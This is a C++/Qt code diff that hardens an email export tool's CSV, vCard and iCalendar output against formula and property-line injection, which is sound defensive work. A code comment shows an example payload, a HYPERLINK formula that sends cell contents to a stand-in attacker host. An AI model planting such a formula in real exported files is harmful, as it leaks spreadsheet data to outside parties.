@@ -62,15 +62,51 @@ QString foldHeaderLine(const QString& name, const QString& value) {
     return result;
 }
 
+/// True when a cell value would be interpreted as a formula by a spreadsheet
+/// application (leading = + - @, or a leading tab/CR).
+bool startsWithFormulaChar(const QString& value) {
+    const QString trimmed = value.trimmed();
+    if (trimmed.isEmpty()) {
+        return false;
+    }
+    const QChar first = trimmed.at(0);
+    return first == QLatin1Char('=') || first == QLatin1Char('+') || first == QLatin1Char('-') ||
+           first == QLatin1Char('@') || first == QLatin1Char('\t') || first == QLatin1Char('\r');
+}
+
 /// Escape a value for CSV output
 QString csvEscape(const QString& value, QChar delimiter) {
-    if (value.contains(delimiter) || value.contains(QLatin1Char('"')) ||
-        value.contains(QLatin1Char('\n')) || value.contains(QLatin1Char('\r'))) {
-        QString escaped = value;
+    QString sanitized = value;
+
+    // Formula/CSV injection: a cell like =HYPERLINK("http://attacker/"&A1) is
+    // executed when the CSV is opened in Excel/Calc. Prefix a single quote so the
+    // value is forced to plain text.
+    if (startsWithFormulaChar(sanitized)) {
+        sanitized.prepend(QLatin1Char('\''));
+    }
+
+    if (sanitized.contains(delimiter) || sanitized.contains(QLatin1Char('"')) ||
+        sanitized.contains(QLatin1Char('\n')) || sanitized.contains(QLatin1Char('\r'))) {
+        QString escaped = sanitized;
         escaped.replace(QLatin1Char('"'), QStringLiteral("\"\""));
         return QLatin1Char('"') + escaped + QLatin1Char('"');
     }
-    return value;
+    return sanitized;
+}
+
+/// Escape a value for a vCard (RFC 6350) / iCalendar (RFC 5545) TEXT property.
+/// Backslash, semicolon and comma are escaped, and any CR/LF is turned into the
+/// literal "\n" sequence so an embedded newline cannot terminate the property
+/// line and inject a forged one (e.g. a spurious TEL/ATTENDEE property).
+QString escapeCalendarText(const QString& value) {
+    QString out = value;
+    out.replace(QLatin1Char('\\'), QStringLiteral("\\\\"));
+    out.replace(QLatin1Char(';'), QStringLiteral("\\;"));
+    out.replace(QLatin1Char(','), QStringLiteral("\\,"));
+    out.replace(QStringLiteral("\r\n"), QStringLiteral("\\n"));
+    out.replace(QLatin1Char('\r'), QStringLiteral("\\n"));
+    out.replace(QLatin1Char('\n'), QStringLiteral("\\n"));
+    return out;
 }
 
 /// Format a datetime for RFC 5322 (email headers)
@@ -323,7 +359,7 @@ const CsvFieldMap& csvFieldMap() {
 /// Append a vCard field line only if value is non-empty
 void appendVcfField(QByteArray& vcf, const char* tag, const QString& value) {
     if (!value.isEmpty()) {
-        vcf += tag + value.toUtf8() + "\r\n";
+        vcf += tag + escapeCalendarText(value).toUtf8() + "\r\n";
     }
 }
 
@@ -831,8 +867,10 @@ QByteArray EmailExportWorker::buildVcfContent(const sak::PstItemDetail& contact)
     vcf += "BEGIN:VCARD\r\n";
     vcf += "VERSION:3.0\r\n";
 
-    // N: Surname;Given name
-    vcf += "N:" + contact.surname.toUtf8() + ";" + contact.given_name.toUtf8() + ";;;\r\n";
+    // N: Surname;Given name (each component escaped so a value cannot inject a
+    // new structured field or property line)
+    vcf += "N:" + escapeCalendarText(contact.surname).toUtf8() + ";" +
+           escapeCalendarText(contact.given_name).toUtf8() + ";;;\r\n";
 
     // FN: Full name
     QString full_name = contact.given_name;
@@ -891,23 +929,18 @@ QByteArray EmailExportWorker::buildIcsContent(const QVector<sak::PstItemDetail>&
             ics += "DTEND:" + toIcsDateTime(event.end_time).toUtf8() + "\r\n";
         }
         if (!event.subject.isEmpty()) {
-            ics += "SUMMARY:" + event.subject.toUtf8() + "\r\n";
+            ics += "SUMMARY:" + escapeCalendarText(event.subject).toUtf8() + "\r\n";
         }
         if (!event.location.isEmpty()) {
-            ics += "LOCATION:" + event.location.toUtf8() + "\r\n";
+            ics += "LOCATION:" + escapeCalendarText(event.location).toUtf8() + "\r\n";
         }
         if (!event.body_plain.isEmpty()) {
-            // Escape newlines for iCalendar
-            QString desc = event.body_plain;
-            desc.replace(QLatin1Char('\\'), QStringLiteral("\\\\"));
-            desc.replace(QLatin1Char('\n'), QStringLiteral("\\n"));
-            desc.replace(QLatin1Char(','), QStringLiteral("\\,"));
-            desc.replace(QLatin1Char(';'), QStringLiteral("\\;"));
-            ics += "DESCRIPTION:" + desc.toUtf8() + "\r\n";
+            ics += "DESCRIPTION:" + escapeCalendarText(event.body_plain).toUtf8() + "\r\n";
         }
 
         for (const auto& attendee : event.attendees) {
-            ics += "ATTENDEE;CN=" + attendee.toUtf8() + ":mailto:" + attendee.toUtf8() + "\r\n";
+            const QByteArray cn = escapeCalendarText(attendee).toUtf8();
+            ics += "ATTENDEE;CN=" + cn + ":mailto:" + cn + "\r\n";
         }
 
         ics += "END:VEVENT\r\n";
